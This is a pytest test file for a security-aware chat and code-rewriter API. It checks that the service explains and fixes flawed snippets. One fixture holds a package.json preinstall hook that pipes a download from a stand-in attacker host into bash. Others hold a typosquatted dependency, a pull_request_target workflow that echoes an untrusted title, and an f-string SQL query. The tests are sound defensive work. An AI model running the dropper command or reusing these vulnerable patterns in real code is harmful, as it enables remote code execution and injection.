"""Tests for the BARQAI Interactive Chat & Code Rewriter endpoint."""

import pytest
from httpx import AsyncClient


@pytest.mark.asyncio
async def test_01_chat_explains_preinstall_lifecycle_dropper(client: AsyncClient):
    payload = {
        "message": "Why is npm install failing or flagged in this package.json?",
        "code_snippet": '{\n  "scripts": {\n    "preinstall": "curl -s http://malicious.c2/drop.sh | bash"\n  }\n}',
        "file_path": "package.json",
        "action": "explain",
    }
    res = await client.post("/api/v1/barqai/chat", json=payload)
    assert res.status_code == 200
    data = res.json()
    assert "Remote Code Execution" in data["explanation"] or "preinstall" in data["explanation"].lower()
    assert "curl" not in data["rewritten_code"] or "eliminated" in data["rewritten_code"]
    assert data["diff"] is not None
    assert len(data["suggested_actions"]) >= 1


@pytest.mark.asyncio
async def test_02_chat_rewrites_typosquatted_package(client: AsyncClient):
    payload = {
        "message": "Can you rewrite my dependencies? I see an error with lodashe.",
        "code_snippet": '{\n  "dependencies": {\n    "lodashe": "^4.17.21"\n  }\n}',
        "file_path": "package.json",
        "action": "rewrite",
    }
    res = await client.post("/api/v1/barqai/chat", json=payload)
    assert res.status_code == 200
    data = res.json()
    assert "Typosquatting" in data["explanation"] or "typosquat" in data["explanation"].lower()
    assert '"lodash":' in data["rewritten_code"]
    assert "lodashe" not in data["rewritten_code"]
    assert "-    \"lodashe\":" in data["diff"]
    assert "+    \"lodash\":" in data["diff"]


@pytest.mark.asyncio
async def test_03_chat_rewrites_workflow_privilege_escalation(client: AsyncClient):
    payload = {
        "message": "Explain why this GitHub action is dangerous and rewrite it.",
        "code_snippet": 'name: Validate\non: pull_request_target\njobs:\n  run:\n    steps:\n      - run: echo "${{ github.event.pull_request.title }}"',
        "file_path": ".github/workflows/validate.yml",
        "action": "rewrite",
    }
    res = await client.post("/api/v1/barqai/chat", json=payload)
    assert res.status_code == 200
    data = res.json()
    assert "Privilege Escalation" in data["explanation"] or "privilege" in data["explanation"].lower()
    assert "pull_request_target" not in data["rewritten_code"]
    assert "pull_request" in data["rewritten_code"]


@pytest.mark.asyncio
async def test_04_chat_alias_route_functional(client: AsyncClient):
    payload = {
        "message": "Hello BARQAI, what do you do?",
        "action": "chat",
    }
    res = await client.post("/api/v1/chat", json=payload)
    assert res.status_code == 200
    data = res.json()
    assert len(data["reply"]) > 0
    assert data["model"] is not None


@pytest.mark.asyncio
async def test_05_chat_explains_http_404_not_found(client: AsyncClient):
    payload = {
        "message": "I am getting HTTP 404 Not Found when calling my endpoint. Why?",
        "action": "explain",
    }
    res = await client.post("/api/v1/barqai/chat", json=payload)
    assert res.status_code == 200
    data = res.json()
    assert "404" in data["explanation"]
    assert "Route" in data["explanation"] or "endpoint" in data["explanation"].lower()
    assert data["rewritten_code"] is not None


@pytest.mark.asyncio
async def test_06_chat_explains_cors_policy_violation(client: AsyncClient):
    payload = {
        "message": "CORS error: No Access-Control-Allow-Origin header is present on requested resource.",
        "action": "explain",
    }
    res = await client.post("/api/v1/barqai/chat", json=payload)
    assert res.status_code == 200
    data = res.json()
    assert "CORS" in data["explanation"]
    assert "CORSMiddleware" in data["rewritten_code"] or "Access-Control" in data["rewritten_code"]


@pytest.mark.asyncio
async def test_07_chat_explains_typeerror_null_dereference(client: AsyncClient):
    payload = {
        "message": "TypeError: Cannot read properties of undefined (reading 'name')",
        "code_snippet": "const userName = data.user.name;",
        "file_path": "src/user.ts",
    }
    res = await client.post("/api/v1/barqai/chat", json=payload)
    assert res.status_code == 200
    data = res.json()
    assert "TypeError" in data["explanation"] or "Null" in data["explanation"]
    assert "?." in data["rewritten_code"] or "if (" in data["rewritten_code"]


@pytest.mark.asyncio
async def test_08_chat_explains_sql_injection(client: AsyncClient):
    payload = {
        "message": "Explain this SQL injection finding and rewrite it safely",
        "code_snippet": 'cursor.execute(f"SELECT * FROM users WHERE name = \'{user_input}\'")',
        "file_path": "src/db.py",
    }
    res = await client.post("/api/v1/barqai/chat", json=payload)
    assert res.status_code == 200
    data = res.json()
    assert "SQL Injection" in data["explanation"] or "CWE-89" in data["explanation"]
    assert "$1" in data["rewritten_code"] or "%s" in data["rewritten_code"] or "param" in data["rewritten_code"]


@pytest.mark.asyncio
async def test_09_chat_explains_econnrefused(client: AsyncClient):
    payload = {
        "message": "Error: connect ECONNREFUSED 127.0.0.1:5432",
    }
    res = await client.post("/api/v1/barqai/chat", json=payload)
    assert res.status_code == 200
    data = res.json()
    assert "ECONNREFUSED" in data["explanation"] or "Connection Refused" in data["explanation"]
    assert "retry" in data["rewritten_code"].lower() or "backoff" in data["rewritten_code"].lower()
